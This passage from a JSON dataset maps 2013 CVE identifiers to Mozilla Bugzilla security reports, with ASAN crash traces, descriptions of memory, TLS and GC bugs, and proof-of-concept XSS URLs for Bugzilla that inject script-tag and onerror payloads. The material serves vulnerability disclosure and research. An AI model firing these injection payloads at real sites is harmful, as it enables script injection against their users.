mozilla::RefreshDriverTimer::TickDriver(nsRefreshDriver*, long, mozilla::TimeStamp) /builds/slave/m-cen-l64-asan-000000000000000/build/layout/base/nsRefreshDriver.cpp:171:0 #11 0x7f58fb5889f0 in mozilla::RefreshDriverTimer::Tick() /builds/slave/m-cen-l64-asan-000000000000000/build/layout/base/nsRefreshDriver.cpp:163:0 #12 0x7f58ff1ace1a in nsTimerImpl::Fire() /builds/slave/m-cen-l64-asan-000000000000000/build/xpcom/threads/nsTimerImpl.cpp:544:0 #13 0x7f58ff1ad4a6 in nsTimerEvent::Run() /builds/slave/m-cen-l64-asan-000000000000000/build/xpcom/threads/nsTimerImpl.cpp:628:0 #14 0x7f58ff1a2829 in nsThread::ProcessNextEvent(bool, bool*) /builds/slave/m-cen-l64-asan-000000000000000/build/xpcom/threads/nsThread.cpp:622:0 #15 0x7f58ff0cc8c6 in NS_ProcessNextEvent(nsIThread*, bool) /builds/slave/m-cen-l64-asan-000000000000000/build/obj-firefox/xpcom/build/nsThreadUtils.cpp:238:0 #16 0x7f58fdf5fc51 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/slave/m-cen-l64-asan-000000000000000/build/ipc/glue/MessagePump.cpp:81:0 #17 0x7f58ff2ca6c3 in MessageLoop::RunInternal() /builds/slave/m-cen-l64-asan-000000000000000/build/ipc/chromium/src/base/message_loop.cc:220:0 #18 0x7f58ff2ca6c3 in MessageLoop::RunHandler() /builds/slave/m-cen-l64-asan-000000000000000/build/ipc/chromium/src/base/message_loop.cc:213:0 #19 0x7f58ff2ca6c3 in MessageLoop::Run() /builds/slave/m-cen-l64-asan-000000000000000/build/ipc/chromium/src/base/message_loop.cc:187:0 #20 0x7f58fdd4e6cc in nsBaseAppShell::Run() /builds/slave/m-cen-l64-asan-000000000000000/build/widget/xpwidgets/nsBaseAppShell.cpp:163:0 #21 0x7f58fd74663e in nsAppStartup::Run() /builds/slave/m-cen-l64-asan-000000000000000/build/toolkit/components/startup/nsAppStartup.cpp:269:0 #22 0x7f58fa95c0f0 in XREMain::XRE_mainRun() /builds/slave/m-cen-l64-asan-000000000000000/build/toolkit/xre/nsAppRunner.cpp:3858:0 #23 0x7f58fa95d055 in XREMain::XRE_main(int, char**, nsXREAppData const*) /builds/slave/m-cen-l64-asan-000000000000000/build/toolkit/xre/nsAppRunner.cpp:3926:0 #24 0x7f58fa95df8b in XRE_main /builds/slave/m-cen-l64-asan-000000000000000/build/toolkit/xre/nsAppRunner.cpp:4128:0 #25 0x459c8d in do_main(int, char**, nsIFile*) /builds/slave/m-cen-l64-asan-000000000000000/build/browser/app/nsBrowserApp.cpp:275:0 #26 0x459c8d in main /builds/slave/m-cen-l64-asan-000000000000000/build/browser/app/nsBrowserApp.cpp:635:0 #27 0x7f5909567ea4 in ?? ??:0 #28 0x45910c in _start ??:? ==7971==ABORTING"
      }
    ],
    "CVE-2013-1737": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=907727",
        "title": "Accessor user-defined properties on DOM proxies get the wrong \"this\" object: the expando object",
        "description": "If you load the attached testcase, you get an exception when you should get the HTMLOptionElement. The reason is this callstack: #11 0x000000010187efd1 in JS_GetPropertyById (cx=0x115e0f640, objArg=0x116190220, idArg={asBits = 4643216832}, vp={<js::MutableHandleBase<JS::Value>> = {<js::MutableValueOperations<JS::MutableHandle<JS::Value> >> = {<js::UnbarrieredMutableValueOperations<JS::MutableHandle<JS::Value> >> = {<js::ValueOperations<JS::MutableHandle<JS::Value> >> = {<No data fields>}, <No data fields>}, <No data fields>}, <No data fields>}, ptr = 0x10f9440b8}) at jsapi.cpp:3753 #12 0x0000000106394b20 in mozilla::dom::HTMLSelectElementBinding::DOMProxyHandler::get (this=0x1093d1b40, cx=0x115e0f640, proxy={<js::HandleBase<JSObject *>> = {<No data fields>}, ptr = 0x7fff5fbf9440}, receiver={<js::HandleBase<JSObject *>> = {<No data fields>}, ptr = 0x7fff5fbf9440}, id={<js::HandleBase<jsid>> = {<No data fields>}, ptr = 0x7fff5fbf9470}, vp={<js::MutableHandleBase<JS::Value>> = {<js::MutableValueOperations<JS::MutableHandle<JS::Value> >> = {<js::UnbarrieredMutableValueOperations<JS::MutableHandle<JS::Value> >> = {<js::ValueOperations<JS::MutableHandle<JS::Value> >> = {<No data fields>}, <No data fields>}, <No data fields>}, <No data fields>}, ptr = 0x10f9440b8}) at HTMLSelectElementBinding.cpp:1313 #13 0x0000000101a12889 in js::Proxy::get (cx=0x115e0f640, proxy={<js::HandleBase<JSObject *>> = {<No data fields>}, ptr = 0x7fff5fbf9440}, receiver={<js::HandleBase<JSObject *>> = {<No data fields>}, ptr = 0x7fff5fbf9440}, id={<js::HandleBase<jsid>> = {<No data fields>}, ptr = 0x7fff5fbf9470}, vp={<js::MutableHandleBase<JS::Value>> = {<js::MutableValueOperations<JS::MutableHandle<JS::Value> >> = {<js::UnbarrieredMutableValueOperations<JS::MutableHandle<JS::Value> >> = {<js::ValueOperations<JS::MutableHandle<JS::Value> >> = {<No data fields>}, <No data fields>}, <No data fields>}, <No data fields>}, ptr = 0x10f9440b8}) at jsproxy.cpp:2487 and now we're doing the get on the expando object, and that's what the getter will see. This is bad, because if you just use a scripted getter you get the expando object as \"this\"! Going to mark as security-sensitive for that reason...."
      }
    ],
    "CVE-2013-1738": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=882897",
        "title": "ASAN use-after-free in JS_GetGlobalForScopeChain",
        "description": "The attached testcase crashes Firefox Nightly with the following ASAN output. Needs domFuzzLite and might need several reloads, sometimes helps to open in multiple tabs at the same time. ==7138== ERROR: AddressSanitizer: heap-use-after-free on address 0x7f1337e70060 at pc 0x7f135a3fc2dd bp 0x7fff714b1cf0 sp 0x7fff714b1ce8 READ of size 8 at 0x7f1337e70060 thread T0 #0 0x7f135a3fc2dc in JS_GetGlobalForScopeChain(JSContext*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsapi.cpp:2267:0 #1 0x7f13573d4e42 in xpc_UnmarkGrayContext(JSContext*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/xpcpublic.h:200:0 #2 0x7f1357cd4dec in nsCxPusher::DoPush(JSContext*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/nsCxPusher.cpp:138:0 #3 0x7f1357355794 in nsGlobalWindow::FreeInnerObjects() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/dom/base/nsGlobalWindow.cpp:1462:0 #4 0x7f135735f1dc in nsGlobalWindow::DetachFromDocShell() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/dom/base/nsGlobalWindow.cpp:2733:0 #5 0x7f1357d56bee in nsDocShell::Destroy() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/docshell/base/nsDocShell.cpp:4960:0 #6 0x7f1357d56f7f in non-virtual thunk to nsDocShell::Destroy() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/docshell/base/nsDocShell.cpp:4993:0 #7 0x7f1356c72f32 in nsFrameLoader::Finalize() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsFrameLoader.cpp:574:0 #8 0x7f1356c18aa9 in nsDocument::MaybeInitializeFinalizeFrameLoaders() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsDocument.cpp:6267:0 #9 0x7f1356c4ea49 in nsRunnableMethodImpl<void (nsDocument::*)(), true>::Run() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/../../../dist/include/nsThreadUtils.h:350:0 #10 0x7f1356baa62f in nsContentUtils::AddScriptRunner(nsIRunnable*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsContentUtils.cpp:4831:0 #11 0x7f1356c262d2 in nsDocument::FinalizeFrameLoader(nsFrameLoader*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsDocument.cpp:6223:0 #12 0x7f1356c7a245 in nsFrameLoader::Destroy() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsFrameLoader.cpp:1365:0 #13 0x7f135702d09d in nsGenericHTMLFrameElement::DestroyContent() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/html/content/src/nsGenericHTMLFrameElement.cpp:274:0 #14 0x7f1356b36562 in mozilla::dom::FragmentOrElement::DestroyContent() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/FragmentOrElement.cpp:950:0 #15 0x7f1356c2f0da in nsDocument::Destroy() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsDocument.cpp:7736:0 #16 0x7f13565ee5cc in nsDocumentViewer::Destroy() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/layout/base/nsDocumentViewer.cpp:1618:0 #17 0x7f13565f0de1 in nsDocumentViewer::Show() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/layout/base/nsDocumentViewer.cpp:1921:0 #18 0x7f135664009d in nsPresContext::EnsureVisible() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/layout/base/nsPresContext.cpp:1856:0 #19 0x7f135665c55b in PresShell::UnsuppressAndInvalidate() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/layout/base/nsPresShell.cpp:3562:0 #20 0x7f13565ea4fa in nsDocumentViewer::LoadComplete(tag_nsresult) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/layout/base/nsDocumentViewer.cpp:1065:0 #21 0x7f1357d62ed4 in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, tag_nsresult) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/docshell/base/nsDocShell.cpp:6657:0 #22 0x7f1357d60a0b in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, tag_nsresult) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/docshell/base/nsDocShell.cpp:6454:0 #23 0x7f1357d60e5f in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, tag_nsresult) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/docshell/base/nsDocShell.cpp:6461:0 #24 0x7f1357d9bf95 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, tag_nsresult) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/uriloader/base/nsDocLoader.cpp:1323:0 #25 0x7f1357d9b69b in nsDocLoader::doStopDocumentLoad(nsIRequest*, tag_nsresult) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/uriloader/base/nsDocLoader.cpp:865:0 #26 0x7f1357d99a12 in nsDocLoader::DocLoaderIsEmpty(bool) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/uriloader/base/nsDocLoader.cpp:755:0 #27 0x7f1357d9aeab in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/uriloader/base/nsDocLoader.cpp:639:0 #28 0x7f1357d9b3dc in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/uriloader/base/nsDocLoader.cpp:643:0 #29 0x7f1355f0985e in nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, tag_nsresult) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/netwerk/base/src/nsLoadGroup.cpp:684:0 #30 0x7f1356c30544 in nsDocument::DoUnblockOnload() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsDocument.cpp:7953:0 #31 0x7f1356c302c1 in nsDocument::UnblockOnload(bool) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsDocument.cpp:7881:0 #32 0x7f1356c19c18 in nsDocument::DispatchContentLoadedEvents() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsDocument.cpp:4625:0 #33 0x7f1356c4ea49 in nsRunnableMethodImpl<void (nsDocument::*)(), true>::Run() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/../../../dist/include/nsThreadUtils.h:350:0 #34 0x7f1358fdc28b in nsThread::ProcessNextEvent(bool, bool*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/xpcom/threads/nsThread.cpp:626:0 #35 0x7f1358f28931 in NS_ProcessNextEvent(nsIThread*, bool) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/obj-firefox/xpcom/build/nsThreadUtils.cpp:238:0 #36 0x7f13584d805b in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/ipc/glue/MessagePump.cpp:82:0 #37 0x7f1359089051 in MessageLoop::RunInternal() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/ipc/chromium/src/base/message_loop.cc:219:0 #38 0x7f1359088f4e in MessageLoop::Run() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/ipc/chromium/src/base/message_loop.cc:186:0 #39 0x7f135832b851 in nsBaseAppShell::Run() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/widget/xpwidgets/nsBaseAppShell.cpp:163:0 #40 0x7f1357ed067f in nsAppStartup::Run() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/toolkit/components/startup/nsAppStartup.cpp:269:0 #41 0x7f1355ca9a39 in XREMain::XRE_mainRun() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/toolkit/xre/nsAppRunner.cpp:3851:0 #42 0x7f1355caad77 in XREMain::XRE_main(int, char**, nsXREAppData const*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/toolkit/xre/nsAppRunner.cpp:3919:0 #43 0x7f1355cab701 in XRE_main /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/toolkit/xre/nsAppRunner.cpp:4121:0 #44 0x40c7e6 in do_main(int, char**, nsIFile*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/browser/app/nsBrowserApp.cpp:272:0 #45 0x40bd0f in main /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/browser/app/nsBrowserApp.cpp:632:0 #46 0x7f1362ac4ea4 in ?? ??:0 0x7f1337e70060 is located 32 bytes inside of 1112-byte region [0x7f1337e70040,0x7f1337e70498) freed by thread T0 here: #0 0x43b0e0 in __interceptor_free ??:? #1 0x7f135a4fe08e in SweepCompartments(js::FreeOp*, JS::Zone*, bool, bool) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsgc.cpp:2524:0 #2 0x7f135a4fda6a in SweepZones(js::FreeOp*, bool) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsgc.cpp:2558:0 #3 0x7f135a4fcc79 in EndSweepPhase(JSRuntime*, js::JSGCInvocationKind, bool) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsgc.cpp:3906:0 #4 0x7f135a4fab7e in IncrementalCollectSlice(JSRuntime*, long, JS::gcreason::Reason, js::JSGCInvocationKind) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsgc.cpp:4308:0 #5 0x7f135a4f9993 in GCCycle(JSRuntime*, bool, long, js::JSGCInvocationKind, JS::gcreason::Reason) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsgc.cpp:4422:0 #6 0x7f135a4ec10e in Collect(JSRuntime*, bool, long, js::JSGCInvocationKind, JS::gcreason::Reason) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsgc.cpp:4581:0 #7 0x7f1357bea26a in nsXPCComponents_Utils::ForceGC() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/XPCComponents.cpp:4012:0 #8 0x7f1359014b05 in NS_InvokeByIndex /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162:0 #9 0x7f1357c69c63 in CallMethodHelper::Call() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/XPCWrappedNative.cpp:2267:0 #10 0x7f1357c69913 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/XPCWrappedNative.cpp:2233:0 #11 0x7f1357c7ebe7 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1480:0 #12 0x7f135a299c48 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jscntxtinlines.h:349:0 #13 0x7f135a299395 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:381:0 #14 0x7f135a2937fa in previously allocated by thread T0 here: #0 0x43b1a0 in malloc ??:? #1 0x7f135a240f59 in js::MallocProvider<JSContext>::malloc_(unsigned long) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jscntxt.h:558:0 #2 0x7f135a4ecd73 in JSCompartment* js::MallocProvider<JSContext>::new_<JSCompartment, JS::Zone*>(JS::Zone*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jscntxt.h:623:0 #3 0x7f135a4ec99e in js::NewCompartment(JSContext*, JS::Zone*, JSPrincipals*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsgc.cpp:4724:0 #4 0x7f135a4023fb in JS_NewGlobalObject(JSContext*, JSClass*, JSPrincipals*, unsigned long) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsapi.cpp:3446:0 #5 0x7f1357cd8e60 in xpc::CreateGlobalObject(JSContext*, JSClass*, nsIPrincipal*, unsigned long) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/nsXPConnect.cpp:994:0 #6 0x7f1357c5e80a in XPCWrappedNative::WrapNewGlobal(xpcObjectHelper&, nsIPrincipal*, bool, unsigned long, XPCWrappedNative**) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/XPCWrappedNative.cpp:318:0 #7 0x7f1357cd972e in nsXPConnect::InitClassesWithNewWrappedGlobal(JSContext*, nsISupports*, nsIPrincipal*, unsigned int, unsigned long, nsIXPConnectJSObjectHolder**) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/nsXPConnect.cpp:1050:0 #8 0x7f135735cffb in CreateNativeGlobalForInner(JSContext*, nsGlobalWindow*, nsIURI*, nsIPrincipal*, JSObject**, nsIXPConnectJSObjectHolder**) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/dom/base/nsGlobalWindow.cpp:2142:0 Shadow byte and word: 0x1fe266fce00c: fd 0x1fe266fce008: fd fd fd fd fd fd fd fd More shadow bytes: 0x1fe266fcdfe8: 00 00 00 00 00 00 00 00 0x1fe266fcdff0: 00 00 00 00 00 00 00 00 0x1fe266fcdff8: 00 00 00 00 00 00 00 00 0x1fe266fce000: fa fa fa fa fa fa fa fa =>0x1fe266fce008: fd fd fd fd fd fd fd fd 0x1fe266fce010: fd fd fd fd fd fd fd fd 0x1fe266fce018: fd fd fd fd fd fd fd fd 0x1fe266fce020: fd fd fd fd fd fd fd fd 0x1fe266fce028: fd fd fd fd fd fd fd fd Stats: 442M malloced (440M for red zones) by 993366 calls Stats: 41M realloced by 42405 calls Stats: 412M freed by 851905 calls Stats: 376M really freed by 790743 calls Stats: 270M (69346 full pages) mmaped in 483 calls mmaps by size class: 7:159705; 8:57316; 9:17391; 10:8176; 11:7395; 12:1792; 13:1856; 14:512; 15:256; 16:656; 17:456; 18:26; 19:36; 20:23; 21:11; mallocs by size class: 7:688188; 8:180185; 9:48390; 10:33029; 11:23787; 12:5112; 13:6965; 14:2704; 15:980; 16:1981; 17:1831; 18:86; 19:53; 20:46; 21:29; frees by size class: 7:599202; 8:143470; 9:39569; 10:29869; 11:21822; 12:4171; 13:6532; 14:2509; 15:864; 16:1880; 17:1815; 18:81; 19:49; 20:44; 21:28; rfrees by size class: 7:566830; 8:128961; 9:33347; 10:26920; 11:18811; 12:3575; 13:5684; 14:2229; 15:794; 16:1768; 17:1632; 18:78; 19:45; 20:41; 21:28; Stats: malloc large: 5006 small slow: 11181"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=887334",
        "title": "GC hazard with default compartments and frame chain restoration",
        "description": "Default compartments make our book keeping tricky in a number of ways: * When we're in the default compartment, enterCompartmentDepth is zero but cx->compartment() is non-null. * The default compartment on a cx can change at any time, even when we've already got code running on that cx. * The default compartment is actually tracked by a \"default compartment object\", which is the outer window in Gecko. But this object gets transplanted, so even if it stays the same, the compartment we compute from it varies with time. Meanwhile, saveFrameChain slurps up the current compartment and enterCompartmentDepth of a cx and pushes it onto a stack, putting the cx in whatever compartment currently holds the associated default compartment object. restoreFrameChain pops the stack and resets the previous compartment and enterCompartmentDepth. This whole setup significantly complicates our attempt to mark all the live globals in the system. Currently, we do three things: (A) (In the JS Engine): Mark the global associated with each frame on the stack. (B) (In the JS Engine): Iterate over all the compartments, and mark those we've called enter() on. (C) (In XPConnect): Iterate over all the contexts, and mark the global associated with the default compartment object. This usually works. But it breaks in the following case: 1 - cx->enterCompartmentDepth is zero, and cx is in the default compartment. There is no code running on cx. 2 - We push cx, causing us to call saveFrameChain, stashing the tuple (0, defaultCompartmentObject->compartment()) onto the SavedFrameChain stack. 3 - We either call JS_SetGlobalObject(cx, someOtherObject), or transplant defaultCompartmentObject to another compartment. 4 - We pop cx, causing us to call restoreFrameChain, setting cx->enterCompartmentDepth to 0, and putting cx in the old compartment, which is no longer equal to cx->defaultCompartmentObject->compartment(). After (3), nothing is keeping the saved compartment alive (See A-C above): (A) No code was running in (1), we don't have any stack frames to trace. (B) We never call enter() on default compartments. (C) The compartment doesn't match that of the defaultCompartmentObject on the cx, so the XPConnect hook misses it. We can keep the compartment alive between (3) and (4) by calling enter() on all the compartments we push onto the SavedFrameChain stack (luke suggested this on monday). But once (4) happens, we'd have to call leave(), and still be screwed. I then thought that we could check in saveFrameChain whether we either (a) have manually entered the current compartment or (b) have a non-empty scope-chain in the current compartment. If we have neither of the above, we'd set the compartment of the SavedFrameChain to null, and compute the default compartment when it comes time to actually use it. But if (b) is the case, then we're still in trouble, because as soon as the associated code is finished running, the cx will remain in that compartment, but we'll have no way to mark it (since none of A-C will apply once the last stack frame is popped). In general, the solution here is to rip out default compartment objects, and I have a plan to do that. But I'd like to find a well-contained fix here that we can backport. Thoughts, luke?"
      }
    ],
    "CVE-2013-1740": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=919877",
        "title": "When false start is enabled, libssl will sometimes return unencrypted, unauthenticated data from PR_Recv",
        "description": "While working on updating strsclnt to actually test false start [1] as part of bug 713933, I added a SSL_TRC call to ssl_SecureSend that would be triggered whenever we are sending data when !ss->isFirstHsDone. However, when running strsclnt, that condition was never true, even when we were false starting. That is because of this code: > @@ -103,20 +103,22 @@ ssl_Do1stHandshake(sslSocket *ss) > > SSL_TRC(3, (\"%d: SSL[%d]: handshake is completed\", > SSL_GETPID(), ss->fd)); > /* call handshake callback for ssl v2 */ > /* for v3 this is done in ssl3_HandleFinished() */ > if ((ss->handshakeCallback != NULL) && /* has callback */ > (!ss->firstHsDone) && /* only first time */ > (ss->version < SSL_LIBRARY_VERSION_3_0)) { /* not ssl3 */ > - ss->firstHsDone = PR_TRUE; > + ss->firstHsDone = PR_TRUE; > + ss->enoughFirstHsDone = PR_TRUE; > (ss->handshakeCallback)(ss->fd, ss->handshakeCallbackData); > } > - ss->firstHsDone = PR_TRUE; > + ss->firstHsDone = PR_TRUE; > + ss->enoughFirstHsDone = PR_TRUE; > ss->gs.writeOffset = 0; > ss->gs.readOffset = 0; The problem isn't with the changes made by my patch, but with the existing code that sets ss->firstHsDone = PR_TRUE (the bottom instance). To verify that this is actually problematic, I modified libssl so that, when ss->sec.isServer is true, it would skip sending change_cipher_spec, skip sending the finished message, and skip switching its write cipher spec to the encrypted/authenticated cipher spec. With these changes, selfserv will send its application_data records unencrypted and unauthenticated immediately after the ServerHelloDone. Then, I stripped sslstress.txt down to only the new ECC false start cases I added. Finally, I added a breakpoint between the point where strsclnt sends its HTTP request and the point where it receives the HTTP response. In the debugger, I verified that the application data was received by strsclnt unencrypted and unauthenticated, and that libssl returned the unencrypted and unauthenticated data unmodified to strsclnt. strsclnt seems to use blocking I/O. Firefox and Chromium use non-blocking I/O. I attempted to create a test case using non-blocking I/O to trigger this wrong behavior. However, so far I have not been able to. I am still investigating why. It appears there may some significant difference in the SSL handshake gathering logic in the blocking and non-blocking cases. It could be that the blocking I/O case is the only one that is problematic but I haven't verified that yet. Again, it does not seem like the changes for bug 713933 caused this problem. However, now I am going to go back and do my experiment on a version of libssl without the patches in that bug. [1] The existing strsclnt test script, sslstress.txt, only contains entries for false start that use RSA key exchange. However, the default libssl criteria for false start was changed after that those test cases were added, and now libssl won't (by default) allow false start for connections using RSA key exchange, so the tests haven't really testing false start for a while."
      }
    ],
    "CVE-2013-1741": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=925100",
        "title": "Integer truncation leads to runaway memset in NSS certificate parsing",
        "description": "Tavis Ormandy of Google reported this bug. The Chromium issue is https://code.google.com/p/chromium/issues/detail?id=302790. Adam wrote in the Chromium issue: Tavis found that it's possible to trigger a runaway memset in NSS when parsing a certificate. sec_asn1d_zalloc allocates length & 0xffffffff but then memsets with length as a size_t. This issue also affects Firefox. It's unclear what the severity of this issue is. Tavis doesn't think it's good, but it appears that it would always involve memsetting at least 4GB of random memory, so it may be just a crash. I attached Adam's patch."
      }
    ],
    "CVE-2013-1742": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=924802",
        "title": "[SECURITY] (XSS) \"id\" and \"sortkey\" are not sanitized when editing flag types if categoryAction-foo is set",
        "description": "PoC: http://localhost/bugzilla/editflagtypes.cgi?action=insert&can_fully_edit=1&id=\"><script>alert(1)</script>&token=&target_type=bug&check_clusions=1&name=test1&description=test2&product=TestProduct&component=TestComponent&categoryAction-include=Include&sortkey=1&is_active=on&is_requestable=on&cc_list=&is_requesteeble=on&is_multiplicable=on&grant_group=&request_group= http://localhost/bugzilla/editflagtypes.cgi?action=insert&can_fully_edit=1&id=&token=&target_type=bug&check_clusions=1&name=test&description=test2&product=TestProduct&component=TestComponent&categoryAction-include=Include&sortkey=1\"><script>alert(2)</script>&is_active=on&is_requestable=on&cc_list=&is_requesteeble=on&is_multiplicable=on&grant_group=&request_group="
      }
    ],
    "CVE-2013-1743": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=924932",
        "title": "[SECURITY] Field values are (still) not escaped correctly in tabular reports",
        "description": "1. Create bug with summary: test'\">'\"><img src=x onerror=alert(1); '\"> 2. https://landfill.bugzilla.org/bugzilla-tip/report.cgi?x_axis_field=short_desc&y_axis_field=short_desc&z_axis_field=short_desc&no_redirect=1&query_format=report-table&short_desc_type=allwordssubstr&short_desc=&resolution=---&longdesc_type=allwordssubstr&longdesc=&bug_file_loc_type=allwordssubstr&bug_file_loc=&status_whiteboard_type=allwordssubstr&status_whiteboard=&keywords_type=allwords&keywords=&deadlinefrom=&deadlineto=&bug_id=22386%2C22387&bug_id_type=anyexact&emailassigned_to1=1&emailtype1=substring&email1=&emailassigned_to2=1&emailreporter2=1&emailqa_contact2=1&emailcc2=1&emailtype2=substring&email2=&emaillongdesc3=1&emailtype3=substring&email3=&chfieldvalue=&chfieldfrom=&chfieldto=Now&j_top=AND&f1=noop&o1=noop&v1=&format=table&action=wrap"
      }
    ],
    "CVE-2013-5209": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=905080",
        "title": "Uninitialised value use relating to sctp_send_initiate_ack",
        "description": "TEST_PATH=dom/media/tests/mochitest/test_dataChannel_basicAudio.html It appears that sctp_send_initiate_ack is creating uninitialised values which are then copied to various different places, and result in multiple Memcheck error reports. Thread 3: Use of uninitialised value of size 8 at 0x58422C9: sctp_calculate_cksum (sctp_crc32.c:555) by 0x585F821: sctp_lowlevel_chunk_output (sctp_output.c:4808) by 0x586B084: sctp_send_initiate_ack (sctp_output.c:6295) by 0x584BE38: sctp_handle_init (sctp_input.c:217) by 0x5851BA8: sctp_process_control (sctp_input.c:4887) by 0x5855EE9: sctp_common_input_processing (sctp_input.c:5907) by 0x5891E30: usrsctp_conninput (user_socket.c:3189) by 0x58929E6: mozilla::DataChannelConnection::SctpDtlsInput(mozilla::TransportFlow*, unsigned char const*, unsigned long) (DataChannel.cpp:654) by 0x5891FC7: sigslot::_connection3<mozilla::MediaPipeline, mozilla::TransportLayer*, unsigned char const*, unsigned long, sigslot::single_threaded>::emit(mozilla::TransportLayer*, unsigned char const*, unsigned long) (sigslot.h:1944) by 0x700FCD7: mozilla::TransportFlow::PacketReceived(mozilla::TransportLayer*, unsigned char const*, unsigned long) (sigslot.h:2477) by 0x5891FC7: sigslot::_connection3<mozilla::MediaPipeline, mozilla::TransportLayer*, unsigned char const*, unsigned long, sigslot::single_threaded>::emit(mozilla::TransportLayer*, unsigned char const*, unsigned long) (sigslot.h:1944) by 0x70185CD: sigslot::signal3<mozilla::TransportLayer*, unsigned char const*, unsigned long, sigslot::single_threaded>::operator()(mozilla::TransportLayer*, unsigned char const*, unsigned long) (sigslot.h:2477) Use of uninitialised value of size 8 at 